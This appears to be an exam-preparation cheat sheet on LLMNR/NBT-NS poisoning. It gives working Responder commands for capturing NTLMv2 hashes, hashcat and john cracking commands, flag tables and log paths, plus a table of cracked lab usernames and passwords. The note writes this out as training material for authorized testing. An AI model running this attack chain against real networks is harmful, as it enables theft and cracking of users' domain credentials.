# Section 06 — LLMNR/NBT-NS Poisoning from Linux

---

## QUICK REFERENCE — Full Attack Chain

```bash
# STEP 1 — Run Responder in background (tmux pane — leave it running)
sudo responder -I ens224 -wf

# STEP 2 — When hash appears in output, save it
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt

# STEP 3 — Crack
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# STEP 3b — If Hashcat OpenCL broken
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
> `-I ens224` sets the listening interface (change to match your interface). `-w` runs a fake Web Proxy Auto-Discovery (WPAD) server. `-f` fingerprints the OS. Mode `5600` is NTLMv2. Use `john` as a backup if Hashcat fails due to OpenCL driver issues.

---

## Lab Results

| User | Password | Source |
|------|----------|--------|
| backupagent | `h1backup55` | Responder NTLMv2 → Hashcat |
| wley | `transporter@4` | Responder NTLMv2 → Hashcat |

---

## How It Works

1. A host tries to reach `\\printer01`. DNS does not know that name.
2. The host **broadcasts** on the local network: "does anyone know this host?"
3. **Responder answers** that broadcast, pretending to be that host.
4. The victim machine sends an authentication request. That request contains the user's **NTLMv2 hash**.
5. You crack the hash offline to get the cleartext password. Now you have a domain foothold.

**Key ports:** Link-Local Multicast Name Resolution (LLMNR) = UDP 5355 | NetBIOS Name Service (NBT-NS) = UDP 137

---

## Responder Options

```bash
sudo responder -I ens224          # basic active poisoning
sudo responder -I ens224 -wf      # + WPAD proxy + OS fingerprinting
sudo responder -I ens224 -A       # analyze only — no poisoning (passive)
```
> First line: active poisoning only. Second line: also catches browser auth via WPAD and logs OS info. Third line: safe passive mode — just observe, never respond.

| Flag | Effect |
|------|--------|
| `-I` | Interface |
| `-A` | Analyze mode only (passive) |
| `-w` | WPAD rogue proxy — captures HTTP auth from IE |
| `-f` | Fingerprint remote OS |

**Log locations:**
```
/usr/share/responder/logs/
# File format: MODULE-HASHTYPE-CLIENT_IP.txt
# Example: SMB-NTLMv2-SSP-172.16.5.25.txt
```

---

## Cracking NTLMv2

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt   # NTLMv2
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt    # fallback
```
> Mode `5600` is NTLMv2 in Hashcat. John auto-detects the format. Use John if Hashcat throws an OpenCL error on virtual machines.

| Hash Type | Hashcat Mode |
|-----------|-------------|
| NTLMv2 | 5600 |
| NTLMv1 | 5500 |
| NTLM (pass-the-hash) | 1000 |

---

## Tool Comparison

| Tool | Platform | Notes |
|------|----------|-------|
| Responder | Linux | Primary tool for Linux hosts |
| Inveigh / InveighZero | Windows | Responder equivalent (section 07) |

---

## Exam Notes

- **Always run Responder in a tmux pane** — collect while doing other work
- `-A` = passive/safe. Without `-A` = active poisoning — ensure you're authorized
- NTLMv2 ≠ NTLM — **cannot pass NTLMv2**, must crack it first
- If SMB signing is NOT required → relay attack instead of cracking (faster foothold)
- WPAD (`-w`) is high value in large orgs with IE users
- Hash format in log filename: `MODULE-HASHTYPE-CLIENT_IP.txt`
